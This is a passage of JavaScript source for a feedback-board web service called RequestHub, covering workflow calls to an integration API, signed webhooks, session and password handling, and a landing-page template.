const SUBMIT_WORKFLOW_ID = "wf_3316b2d12e5f";
const LIST_WORKFLOW_ID = "wf_a825a0c0f5bd";
const UPDATE_STATUS_WORKFLOW_ID = "wf_b5b1e6e18d9b";
const VOTE_WORKFLOW_ID = "wf_af7b6c5033db";
const ADD_COMMENT_WORKFLOW_ID = "wf_fc41a427478e";
const LIST_COMMENTS_WORKFLOW_ID = "wf_115e3671bb89";
const GET_CUSTOMER_AUTH_WORKFLOW_ID = "wf_0ec5d57bcc56";
const SET_CUSTOMER_PASSWORD_WORKFLOW_ID = "wf_1f8a663661bc";
const GET_CUSTOMER_ORG_WORKFLOW_ID = "wf_c754da22758d";
const SET_CUSTOMER_ORG_WORKFLOW_ID = "wf_3978c47d84a7";
const GET_CUSTOMER_PLAN_WORKFLOW_ID = "wf_e5eabbf1cbca";
const SET_CUSTOMER_PLAN_WORKFLOW_ID = "wf_4ae1ea722645";
const GET_CUSTOMER_SETTINGS_WORKFLOW_ID = "wf_1607747c6266";
const SET_CUSTOMER_SETTINGS_WORKFLOW_ID = "wf_d33fbb3375fe";
const LIST_DESTINATIONS_WORKFLOW_ID = "wf_1c6bab8b15d7";
const LIST_CUSTOMERS_WORKFLOW_ID = "wf_c977bddd9248";
const SEND_MAGIC_LINK_WORKFLOW_ID = "wf_ddff5c764c25";
const VERIFY_MAGIC_LINK_WORKFLOW_ID = "wf_068beffe1147";
const LIST_USERS_WORKFLOW_ID = "wf_dc3c708922b8";
const ADD_USER_WORKFLOW_ID = "wf_598118e16bcb";
const REMOVE_USER_WORKFLOW_ID = "wf_dccff8e93fa9";
const REGISTER_LINEAR_WEBHOOK_WORKFLOW_ID = "wf_55825cf21bfc";
const UNREGISTER_LINEAR_WEBHOOK_WORKFLOW_ID = "wf_9633b10b01af";
const FIND_IDEA_BY_LINEAR_ISSUE_WORKFLOW_ID = "wf_bc7a52df867b";
const GET_LINEAR_WEBHOOK_SECRET_WORKFLOW_ID = "wf_c376837b8860";
const CREATE_WEBHOOK_WORKFLOW_ID = "wf_e13c16fac3dc";
const LIST_WEBHOOKS_WORKFLOW_ID = "wf_655ab12c26b8";
const DELETE_WEBHOOK_WORKFLOW_ID = "wf_c485e6e5025a";
const LIST_WEBHOOKS_FOR_DELIVERY_WORKFLOW_ID = "wf_17330509843e";
const RECORD_WEBHOOK_DELIVERY_WORKFLOW_ID = "wf_f4502de11768";
const LIST_WEBHOOK_DELIVERIES_WORKFLOW_ID = "wf_416dfeafcba9";
const GET_WEBHOOK_DELIVERY_WORKFLOW_ID = "wf_42336ac2e7cd";
const DELETE_IDEA_WORKFLOW_ID = "wf_90a8f1268843";
const LIST_STATUS_HISTORY_WORKFLOW_ID = "wf_144ac631f830";
const LIST_CHANGELOG_WORKFLOW_ID = "wf_69d695b3974e";
const GET_BOARD_STATS_WORKFLOW_ID = "wf_4146c0839e38";
const SET_IDEA_PINNED_WORKFLOW_ID = "wf_50b43c697fb7";
const LIST_SEARCHABLE_COMMENTS_WORKFLOW_ID = "wf_8a542072003b";
const SET_API_KEY_WORKFLOW_ID = "wf_b1a39a7eb739";
const GET_API_KEY_STATUS_WORKFLOW_ID = "wf_28d8c655572b";
const FIND_CUSTOMER_BY_API_KEY_HASH_WORKFLOW_ID = "wf_0931d09170dc";
const SUBSCRIBE_TO_IDEA_WORKFLOW_ID = "wf_0da569772406";
const UNSUBSCRIBE_FROM_IDEA_WORKFLOW_ID = "wf_e9c4ba6a2a89";
const MERGE_IDEAS_WORKFLOW_ID = "wf_6892767f2392";
const GET_IDEA_RAW_WORKFLOW_ID = "wf_9de7b9762be9";
const SET_IDEA_TAGS_WORKFLOW_ID = "wf_3adbca8413a5";
const OWNER_SLUG = "__owner__";

// Bidirectional: a Linear state change updates the matching idea's status in
// either direction (forward or backward), and an idea's status change pushed
// from RequestHub updates the matching Linear ticket's state the same way -
// see requesthub-update-status's syncToLinearState handling.
const LINEAR_STATE_TYPE_TO_STATUS = {
  triage: "planned",
  backlog: "planned",
  unstarted: "planned",
  started: "in_progress",
  completed: "shipped",
  canceled: "declined",
};

const PLANS = [
  { id: "free", name: "Free", price: "$0", period: "/mo", blurb: "Try RequestHub with your own board.", features: ["1 board", "Unlimited ideas & votes", "Community support"] },
  { id: "growth", name: "Growth", price: "$29", period: "/mo", blurb: "For a team that's shipping based on feedback.", features: ["Everything in Free", "Connect Slack, Linear & Notion", "Triage dashboard", "Roadmap view"] },
  { id: "scale", name: "Scale", price: "$99", period: "/mo", blurb: "For teams running this across the whole org.", features: ["Everything in Growth", "Embeddable widget on your site", "Priority support"] },
];
const SESSION_TTL_MS = 1000 * 60 * 60 * 24 * 7;

// Light theme matched against the real app.upvoty.com product (authenticated
// session, 2026-10-31) - sampled via computed styles, not eyeballed from a
// screenshot: page bg, card bg/border/radius, accent purple, status/category
// pill colors and radius, and the Manrope/Montserrat font stack.
const DESIGN_FONT_LINK =
  '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap">';
const DESIGN_TOKENS = `
    :root {
      --bg: #f4f3f7;
      --card: #ffffff;
      --surface-2: #f7f6fa;
      --surface-3: #eeecf5;
      --border: #e7e4f0;
      --text: #26233a;
      --text-muted: #5f5c73;
      --text-faint: #6a6580;
      --accent: #625afa;
      --accent-hover: #5345e5;
      --accent-tint: rgba(98, 90, 250, 0.14);
      --good: #16a34a;
      --good-tint: #e7f8ee;
      --warn: #d97706;
      --warn-tint: #fdf1de;
      --bad: #dc2626;
      --bad-tint: #fdeaea;
      --info: #2f6fed;
      --info-tint: #e9f2fe;
      --radius-card: 16px;
      --radius-pill: 5px;
      --radius-btn: 10px;
    }
    @media (prefers-color-scheme: dark) {
      :root:not([data-theme="light"]) {
        --bg: #17151f; --card: #201e2c; --surface-2: #231f30; --surface-3: #2b2739; --border: #332f41;
        --text: #efedf6; --text-muted: #b2aec2; --text-faint: #8a86a1;
        --accent: #9089ff; --accent-hover: #a39cff; --accent-tint: rgba(144, 137, 255, 0.2);
        --good: #4ade80; --good-tint: rgba(74, 222, 128, 0.16);
        --warn: #fbbf24; --warn-tint: rgba(251, 191, 36, 0.16);
        --bad: #f87171; --bad-tint: rgba(248, 113, 113, 0.16);
        --info: #60a5fa; --info-tint: rgba(96, 165, 250, 0.16);
      }
    }
    :root[data-theme="dark"] {
      --bg: #17151f; --card: #201e2c; --surface-2: #231f30; --surface-3: #2b2739; --border: #332f41;
      --text: #efedf6; --text-muted: #b2aec2; --text-faint: #8a86a1;
      --accent: #9089ff; --accent-hover: #a39cff; --accent-tint: rgba(144, 137, 255, 0.2);
      --good: #4ade80; --good-tint: rgba(74, 222, 128, 0.16);
      --warn: #fbbf24; --warn-tint: rgba(251, 191, 36, 0.16);
      --bad: #f87171; --bad-tint: rgba(248, 113, 113, 0.16);
      --info: #60a5fa; --info-tint: rgba(96, 165, 250, 0.16);
    }
    * { box-sizing: border-box; }
    body {
      margin: 0; background: var(--bg); color: var(--text);
      font-family: "Manrope", -apple-system, sans-serif; font-size: 14px; line-height: 1.5;
      -webkit-font-smoothing: antialiased;
    }
    .icon { width: 15px; height: 15px; display: inline-block; vertical-align: -3px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
    .theme-toggle {
      background: none; border: 1px solid var(--border); border-radius: 8px; width: 30px; height: 30px;
      display: inline-flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-muted); flex-shrink: 0;
    }
    .theme-toggle:hover { color: var(--text); background: var(--surface-2); }
    .tag-chip {
      display: inline-flex; align-items: center; padding: 2px 8px; border-radius: 999px;
      font-weight: 600; font-size: 10.5px; background: var(--surface-3); color: var(--text-muted);
    }
`;
const THEME_TOGGLE_SCRIPT = `
    (function () {
      var ICON_SUN = '<svg class="icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/></svg>';
      var ICON_MOON = '<svg class="icon" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>';
      function applyTheme(theme) {
        if (theme) document.documentElement.setAttribute('data-theme', theme);
        else document.documentElement.removeAttribute('data-theme');
        var btn = document.getElementById('themeToggle');
        if (!btn) return;
        var isDark = theme === 'dark' || (!theme && window.matchMedia('(prefers-color-scheme: dark)').matches);
        btn.innerHTML = isDark ? ICON_SUN : ICON_MOON;
      }
      var saved = null;
      try { saved = localStorage.getItem('requesthub_theme'); } catch {}
      applyTheme(saved);
      document.addEventListener('DOMContentLoaded', function () {
        var btn = document.getElementById('themeToggle');
        if (!btn) return;
        applyTheme(saved);
        btn.addEventListener('click', function () {
          var current = document.documentElement.getAttribute('data-theme');
          var isDark = current === 'dark' || (!current && window.matchMedia('(prefers-color-scheme: dark)').matches);
          var next = isDark ? 'light' : 'dark';
          try { localStorage.setItem('requesthub_theme', next); } catch {}
          applyTheme(next);
        });
      });
    })();
`;
const FASTN_BASE = "https://api.fastn.dev";
const STATUSES = ["under_review", "planned", "in_progress", "shipped", "declined"];
const DEFAULT_STATUS_LABELS = { under_review: "Under Review", planned: "Planned", in_progress: "In Progress", shipped: "Shipped", declined: "Declined" };
const DEFAULT_LINEAR_TEAM_ID = "6a0351f8-9f72-49b7-a11a-753726597688";
// A real Notion DATABASE id (not a page) - each shipped idea becomes its own
// structured row via createDatabaseRowPlainText, not a paragraph appended to a page.
const DEFAULT_NOTION_PAGE_ID = "40aa930e-131b-81ab-a587-c6ee135c8c82";

// Maps a board's customerSlug to its real Fastn tenant (end_org_id), so the
// embedded connect page knows which tenant's widgets to show. "demo" has no
// backing tenant (it predates the multi-tenant work), so it's intentionally
// left out - the connect page shows a clear message for any unmapped slug.
const TENANT_ORG_IDS = {
  "acme-saas": "b14dc996-d036-4797-8908-adbc63f15b77",
  beacon: "c820df81-5aa4-47e8-8071-52dbe011c21d",
  flowdesk: "16cdab4e-702b-4d80-a16c-7a9e8715125e",
  northstar: "83c973c7-601a-4bc5-88f4-d0c73e10c22f",
  "parallel-labs": "ab68e269-2ce3-44ca-ae6b-f8e5ffc3c755",
};

// One widget per connector (the platform caps widgets at 2 connectors each -
// see B04). Each tool gets its own real "Connect" action via a setup link,
// since initiating a brand-new OAuth grant from inside the embedded iframe
// has no reliable way back to the page once Slack's own OAuth severs
// window.opener (see B05) - the setup link is a plain top-level page with no
// popup/opener handshake to break.
const CONNECT_WIDGETS = [
  { slug: "slack", name: "Slack", widgetId: "wgt_de3a3eecea2f", color: "#4A154B" },
  { slug: "linear", name: "Linear", widgetId: "wgt_6d4c5ff802f4", color: "#5E6AD2" },
  { slug: "notion", name: "Notion", widgetId: "wgt_c14882ee7ab3", color: "#000000" },
];

function html(body) {
  return new Response(body, {
    headers: { "content-type": "text/html; charset=utf-8" },
  });
}

function json(obj, status = 200, extraHeaders = {}) {
  return new Response(JSON.stringify(obj), {
    status,
    headers: { "content-type": "application/json; charset=utf-8", ...extraHeaders },
  });
}

async function callWorkflow(env, workflowId, input, endOrgId) {
  const headers = {
    Authorization: `Bearer ${env.FASTN_API_KEY}`,
    "X-fastn-Test-Mode": "true",
    "x-fastn-env": "test",
    "Content-Type": "application/json",
  };
  // Without this, a MULTI_TENANT connector call inside the workflow (Slack post,
  // Linear ticket, Notion archive) falls back to this org's own sole-active
  // connection instead of the tenant's - meaning every customer's status changes
  // would silently use OUR Slack/Linear/Notion regardless of what they connected.
  if (endOrgId) headers["x-end-org-id"] = endOrgId;

  const res = await fetch(`${FASTN_BASE}/api/v1/workflows/${workflowId}/execute`, {
    method: "POST",
    headers,
    body: JSON.stringify({ input }),
  });
  const body = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(body?.error || `Fastn call failed: ${res.status}`);
  }
  return body?.data ?? body;
}

async function signWebhookPayload(secret, rawBody) {
  const key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  return toHex(await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(rawBody)));
}

// Shared by both the automatic fire-and-forget delivery below and the manual
// "Redeliver" action - same POST, same signature, same delivery-log write, so
// a redeliver attempt is indistinguishable from an original one in the log.
async function sendWebhookAndRecord(env, webhookId, url, secret, eventType, body) {
  let deliveryStatus = "error";
  try {
    const signature = await signWebhookPayload(secret, body);
    const res = await fetch(url, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "x-requesthub-signature": signature,
        "x-requesthub-event": eventType,
      },
      body,
    });
    deliveryStatus = res.ok ? "delivered (" + res.status + ")" : "failed (" + res.status + ")";
  } catch {
    // Single attempt, no automatic retry - a dead customer endpoint shouldn't
    // affect anything else in the request that triggered this event. Manual
    // redelivery (Settings -> Webhooks -> Redeliver) is the recovery path.
  }
  try {
    await callWorkflow(env, RECORD_WEBHOOK_DELIVERY_WORKFLOW_ID, { id: webhookId, status: deliveryStatus, eventType, payload: body });
  } catch {}
  return deliveryStatus;
}

// Fire-and-forget outbound delivery to every webhook a tenant has registered
// for this event type. Runs via ctx.waitUntil so it completes after the
// response is already sent back to the caller, without the caller waiting on
// it. See sendWebhookAndRecord for the shared send+log logic, and the
// Settings page's Webhooks card for manual redelivery of a failed attempt.
function deliverWebhooks(env, ctx, customerSlug, eventType, payload) {
  const task = (async () => {
    let webhooks = [];
    try {
      const data = await callWorkflow(env, LIST_WEBHOOKS_FOR_DELIVERY_WORKFLOW_ID, { customerSlug });
      webhooks = (data?.webhooks || []).filter((w) => (w.events || "").split(",").includes(eventType));
    } catch {
      return;
    }
    const body = JSON.stringify({ event: eventType, customerSlug, data: payload, sentAt: new Date().toISOString() });
    await Promise.all(webhooks.map((w) => sendWebhookAndRecord(env, w.id, w.url, w.secret, eventType, body)));
  })();
  if (ctx && ctx.waitUntil) ctx.waitUntil(task);
}

// Single, narrow automation rule (deliberately not a configurable rule
// builder): an idea still "Under Review" that crosses the customer's own
// opt-in vote threshold auto-promotes to Planned via the exact same path a
// human triage action would take - same Linear ticket creation, same
// webhook. Off by default (no threshold configured); never fires twice,
// since the idea is no longer "under_review" after the first promotion.
// Shared by both callers whose action can push an idea over the threshold -
// a direct upvote, and a merge that sums the duplicate's votes onto the
// canonical idea - so the check can't drift between the two.
async function maybeAutoPromote(env, ctx, baseUrl, idea) {
  if (!idea || idea.status !== "under_review" || idea.merged_into_id || !idea.customer_slug) return idea;
  try {
    const customerSlug = idea.customer_slug;
    const settings = await callWorkflow(env, GET_CUSTOMER_SETTINGS_WORKFLOW_ID, { customerSlug });
    if (!settings?.autoPromoteVoteThreshold || idea.votes < settings.autoPromoteVoteThreshold) return idea;
    const endOrgId = await getTenantOrgId(env, customerSlug);
    const promoted = await callWorkflow(
      env,
      UPDATE_STATUS_WORKFLOW_ID,
      {
        ideaId: idea.id,
        status: "planned",
        linearTeamId: settings?.linearTeamId || DEFAULT_LINEAR_TEAM_ID,
        notionPageId: settings?.notionPageId || DEFAULT_NOTION_PAGE_ID,
        linearStateIds: settings?.linearStateIds || {},
        baseUrl,
      },
      endOrgId
    );
    if (promoted?.idea) {
      deliverWebhooks(env, ctx, customerSlug, "idea.status_changed", promoted.idea);
      return promoted.idea;
    }
  } catch {}
  return idea;
}

function escapeHtml(s) {
  return String(s ?? "").replace(/[&<>"']/g, (c) => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
  }[c]));
}

function toHex(buf) {
  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
}
function fromHex(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
  return bytes;
}

async function hashPassword(password, saltHex) {
  const salt = saltHex ? fromHex(saltHex) : crypto.getRandomValues(new Uint8Array(16));
  const keyMaterial = await crypto.subtle.importKey("raw", new TextEncoder().encode(password), "PBKDF2", false, ["deriveBits"]);
  const bits = await crypto.subtle.deriveBits({ name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" }, keyMaterial, 256);
  return { hash: toHex(bits), salt: toHex(salt) };
}

function base64UrlEncode(bytes) {
  let str = btoa(String.fromCharCode(...bytes));
  return str.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function base64UrlDecode(str) {
  str = str.replace(/-/g, "+").replace(/_/g, "/");
  while (str.length % 4) str += "=";
  const bin = atob(str);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

async function hmacKey(env) {
  return crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(env.SESSION_SECRET),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
}

async function createSessionToken(env, customerSlug, email) {
  const payload = { slug: customerSlug, exp: Date.now() + SESSION_TTL_MS };
  if (email) payload.email = email;
  const payloadBytes = new TextEncoder().encode(JSON.stringify(payload));
  const key = await hmacKey(env);
  const sig = new Uint8Array(await crypto.subtle.sign("HMAC", key, payloadBytes));
  return `${base64UrlEncode(payloadBytes)}.${base64UrlEncode(sig)}`;
}

async function verifySessionToken(env, token, customerSlug) {
  if (!token) return false;
  const parts = token.split(".");
  if (parts.length !== 2) return false;
  try {
    const payloadBytes = base64UrlDecode(parts[0]);
    const sigBytes = base64UrlDecode(parts[1]);
    const key = await hmacKey(env);
    const expectedSig = new Uint8Array(await crypto.subtle.sign("HMAC", key, payloadBytes));
    if (expectedSig.length !== sigBytes.length) return false;
    let diff = 0;
    for (let i = 0; i < expectedSig.length; i++) diff |= expectedSig[i] ^ sigBytes[i];
    if (diff !== 0) return false;
    const payload = JSON.parse(new TextDecoder().decode(payloadBytes));
    if (payload.slug !== customerSlug) return false;
    if (!payload.exp || Date.now() > payload.exp) return false;
    return true;
  } catch {
    return false;
  }
}

async function verifyLinearWebhookSignature(secret, rawBody, signatureHeader) {
  if (!secret || !signatureHeader) return false;
  const key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  const expected = toHex(await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(rawBody)));
  if (expected.length !== signatureHeader.length) return false;
  let diff = 0;
  for (let i = 0; i < expected.length; i++) diff |= expected.charCodeAt(i) ^ signatureHeader.charCodeAt(i);
  return diff === 0;
}

function sessionCookieName(customerSlug) {
  return "rh_auth_" + customerSlug.replace(/[^a-z0-9-]/g, "");
}

function getCookie(request, name) {
  const header = request.headers.get("cookie") || "";
  const match = header.match(new RegExp("(?:^|;\\s*)" + name + "=([^;]*)"));
  return match ? decodeURIComponent(match[1]) : null;
}

// A long-lived, anonymous per-visitor id - not an auth credential, just lets
// the vote workflow tell "the same browser clicked twice" from "two
// different people voted once each" without requiring an account. Returns
// the existing one if the request already carries it, or mints a new one.
function getOrCreateVoterKey(request) {
  const existing = getCookie(request, "rh_voter");
  if (existing) return { voterKey: existing, setCookie: null };
  const voterKey = toHex(crypto.getRandomValues(new Uint8Array(16)));
  const setCookie = `rh_voter=${voterKey}; Path=/; Max-Age=31536000; SameSite=Lax; HttpOnly; Secure`;
  return { voterKey, setCookie };
}

async function requireAuth(request, env, customerSlug) {
  const token = getCookie(request, sessionCookieName(customerSlug));
  return verifySessionToken(env, token, customerSlug);
}

async function sha256Hex(text) {
  return toHex(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text)));
}

// Partner-API auth: a tenant's key is a high-entropy random token, hashed
// with a plain unsalted SHA-256 (unlike the admin password, which needs a
// salt against offline guessing - this token is never guessable, so the
// hash only needs to not leak the plaintext if the DB is read). Returns the
// owning customerSlug, or null if the header is missing/malformed/unknown.
async function requireApiKey(request, env) {
  const auth = request.headers.get("authorization") || "";
  const match = auth.match(/^Bearer\s+(rhk_[a-f0-9]{64})$/i);
  if (!match) return null;
  const keyHash = await sha256Hex(match[1].toLowerCase());
  try {
    const data = await callWorkflow(env, FIND_CUSTOMER_BY_API_KEY_HASH_WORKFLOW_ID, { keyHash });
    return data?.customerSlug || null;
  } catch {
    return null;
  }
}

async function mintEmbedToken(env, endOrgId, customerSlug) {
  const res = await fetch(`${FASTN_BASE}/api/v1/embed/token`, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${env.FASTN_API_KEY}`,
      "X-fastn-Test-Mode": "true",
      "x-fastn-env": "test",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      endOrgId,
      createIfMissing: true,
      customerName: customerSlug,
    }),
  });
  const body = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(body?.error || `embed token mint failed: ${res.status}`);
  }
  return body?.data?.token;
}

async function createSetupLink(env, widgetId, endOrgId, label) {
  const res = await fetch(`${FASTN_BASE}/api/v1/setup-links`, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${env.FASTN_API_KEY}`,
      "X-fastn-Test-Mode": "true",
      "x-fastn-env": "test",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ widgetId, endOrgId, label }),
  });
  const body = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(body?.error || `setup link creation failed: ${res.status}`);
  }
  return body?.data?.setupUrl;
}

function slugify(name) {
  let slug = String(name || "")
    .toLowerCase()
    .trim()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "");
  if (slug.length > 48) slug = slug.slice(0, 48).replace(/-+$/g, "");
  return slug;
}

async function createOrg(env, name, slug) {
  const res = await fetch(`${FASTN_BASE}/api/v1/orgs`, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${env.FASTN_API_KEY}`,
      "X-fastn-Test-Mode": "true",
      "x-fastn-env": "test",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ name, slug, type: "end_org" }),
  });
  const body = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(body?.error || `org creation failed: ${res.status}`);
  }
  return body?.data;
}

async function createInstallationForTenant(env, widgetId, endOrgId, label) {
  const res = await fetch(`${FASTN_BASE}/api/v1/installations`, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${env.FASTN_API_KEY}`,
      "X-fastn-Test-Mode": "true",
      "x-fastn-env": "test",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ target_type: "widget", target_id: widgetId, widget_id: widgetId, end_org_id: endOrgId, label }),
  });
  const body = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(body?.error || `installation creation failed: ${res.status}`);
  }
  return body?.data;
}

async function getTenantOrgId(env, customerSlug) {
  if (TENANT_ORG_IDS[customerSlug]) return TENANT_ORG_IDS[customerSlug];
  try {
    const data = await callWorkflow(env, GET_CUSTOMER_ORG_WORKFLOW_ID, { customerSlug });
    return data?.orgId || null;
  } catch {
    return null;
  }
}

function homePage() {
  const pricingCards = PLANS.map(function (p) {
    const features = p.features.map((f) => `<li>${escapeHtml(f)}</li>`).join("");
    return `<div class="plan-card${p.id === "growth" ? " featured" : ""}">
      ${p.id === "growth" ? '<div class="featured-badge">Most popular</div>' : ""}
      <div class="plan-name">${escapeHtml(p.name)}</div>
      <div class="plan-price">${p.price}<span>${p.period}</span></div>
      <div class="plan-blurb">${escapeHtml(p.blurb)}</div>
      <ul class="plan-features">${features}</ul>
      <a class="plan-btn" href="/signup">Get started</a>
    </div>`;
  }).join("");

  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>RequestHub - feedback boards for SaaS teams</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    body { font-weight: 400; }
    a { color: inherit; }
    .nav { position: sticky; top: 0; z-index: 10; background: color-mix(in srgb, var(--bg) 85%, transparent); backdrop-filter: blur(8px); border-bottom: 1px solid var(--border); padding: 14px 24px; display: flex; align-items: center; gap: 10px; }
    .logo-mark { width: 28px; height: 28px; border-radius: 8px; background: var(--accent); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; }
    .brand { font-weight: 700; font-size: 15px; }
    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 18px; }
    .nav-link { color: var(--text-muted); text-decoration: none; font-size: 13.5px; font-weight: 500; }
    .nav-link:hover { color: var(--text); }
    .nav-cta { background: var(--accent); color: #fff; text-decoration: none; font-size: 13.5px; font-weight: 600; padding: 8px 16px; border-radius: 8px; }
    .nav-cta:hover { background: var(--accent-hover); }

    .hero { max-width: 760px; margin: 0 auto; padding: 90px 24px 60px; text-align: center; }
    .hero h1 { font-size: 40px; font-weight: 800; margin: 0 0 16px; letter-spacing: -0.02em; line-height: 1.15; }
    .hero h1 .accent { color: var(--accent); }
    .hero p { color: var(--text-muted); font-size: 16px; margin: 0 0 32px; max-width: 540px; margin-left: auto; margin-right: auto; }
    .hero-ctas { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
    .btn-primary { background: var(--accent); color: #fff; text-decoration: none; font-size: 14.5px; font-weight: 600; padding: 12px 22px; border-radius: 9px; }
    .btn-primary:hover { background: var(--accent-hover); }
    .btn-secondary { background: var(--surface); border: 1px solid var(--border); color: var(--text); text-decoration: none; font-size: 14.5px; font-weight: 600; padding: 12px 22px; border-radius: 9px; }
    .btn-secondary:hover { background: var(--surface-2); }

    .section { max-width: 1040px; margin: 0 auto; padding: 60px 24px; }
    .section-label { text-align: center; color: var(--accent); font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: .06em; margin-bottom: 8px; }
    .section-title { text-align: center; font-size: 26px; font-weight: 700; margin: 0 0 40px; }

    .features { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
    @media (max-width: 760px) { .features { grid-template-columns: 1fr; } }
    .feature-card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 22px 20px; }
    .feature-icon { width: 36px; height: 36px; border-radius: 9px; background: var(--accent-tint); color: var(--accent); display: flex; align-items: center; justify-content: center; margin-bottom: 14px; }
    .feature-icon svg { width: 18px; height: 18px; stroke: currentColor; fill: none; stroke-width: 2; }
    .feature-card h3 { font-size: 15px; margin: 0 0 6px; }
    .feature-card p { color: var(--text-muted); font-size: 13px; margin: 0; line-height: 1.5; }

    .plans { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
    @media (max-width: 760px) { .plans { grid-template-columns: 1fr; } }
    .plan-card { position: relative; background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 22px 20px; display: flex; flex-direction: column; }
    .plan-card.featured { border-color: var(--accent); }
    .featured-badge { position: absolute; top: -10px; left: 20px; background: var(--accent); color: #fff; font-size: 10.5px; font-weight: 700; padding: 3px 10px; border-radius: 999px; text-transform: uppercase; letter-spacing: .03em; }
    .plan-name { font-weight: 700; font-size: 16px; margin-bottom: 6px; }
    .plan-price { font-size: 26px; font-weight: 700; margin-bottom: 8px; }
    .plan-price span { font-size: 13px; font-weight: 500; color: var(--text-muted); }
    .plan-blurb { color: var(--text-muted); font-size: 12.5px; margin-bottom: 16px; line-height: 1.4; }
    .plan-features { list-style: none; padding: 0; margin: 0 0 20px; flex: 1; }
    .plan-features li { font-size: 13px; color: var(--text-muted); padding: 5px 0 5px 20px; position: relative; }
    .plan-features li::before { content: "✓"; position: absolute; left: 0; color: var(--good); font-weight: 700; }
    .plan-btn { display: block; text-align: center; background: var(--accent); color: #fff; text-decoration: none; padding: 10px; border-radius: var(--radius-btn); font-size: 13.5px; font-weight: 600; }
    .plan-btn:hover { background: var(--accent-hover); }

    .cta-band { max-width: 760px; margin: 0 auto; padding: 50px 24px 100px; text-align: center; }
    .cta-band h2 { font-size: 24px; margin: 0 0 10px; }
    .cta-band p { color: var(--text-muted); font-size: 14px; margin: 0 0 24px; }

    .footer { border-top: 1px solid var(--border); text-align: center; color: var(--text-faint); font-size: 12px; padding: 24px; }
  </style>
</head>
<body>
  <div class="nav">
    <div class="logo-mark">R</div>
    <div class="brand">RequestHub</div>
    <div class="nav-right">
      <a class="nav-link" href="#pricing">Pricing</a>
      <a class="nav-link" href="/login">Log in</a>
      <a class="nav-cta" href="/signup">Get started</a>
      <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode"></button>
    </div>
  </div>

  <div class="hero">
    <h1>Turn customer feedback into your <span class="accent">product roadmap</span></h1>
    <p>A branded feedback board for your SaaS - submissions, votes, and a public roadmap, wired into your own Slack, Linear, and Notion. Add it to your site with one line of code.</p>
    <div class="hero-ctas">
      <a class="btn-primary" href="/signup">Start free - no card required</a>
      <a class="btn-secondary" href="/b/demo">See a live demo &rarr;</a>
    </div>
  </div>

  <div class="section">
    <div class="section-label">What you get</div>
    <div class="section-title">Everything a feedback loop needs</div>
    <div class="features">
      <div class="feature-card">
        <div class="feature-icon"><svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 0 1-4.8 7.6 8.5 8.5 0 0 1-9.4-1.2L3 21l1.9-4.3a8.38 8.38 0 0 1-1.2-4.4 8.5 8.5 0 0 1 7.6-8.4 8.38 8.38 0 0 1 9.5 7.1 8.5 8.5 0 0 1 .2 1.5z"/></svg></div>
        <h3>Public feedback board</h3>
        <p>Your customers submit ideas, bugs, and feedback, vote on what matters, and see it move through your pipeline.</p>
      </div>
      <div class="feature-card">
        <div class="feature-icon"><svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="16" rx="2"/><line x1="9" y1="4" x2="9" y2="20"/><line x1="15" y1="4" x2="15" y2="20"/></svg></div>
        <h3>Kanban roadmap</h3>
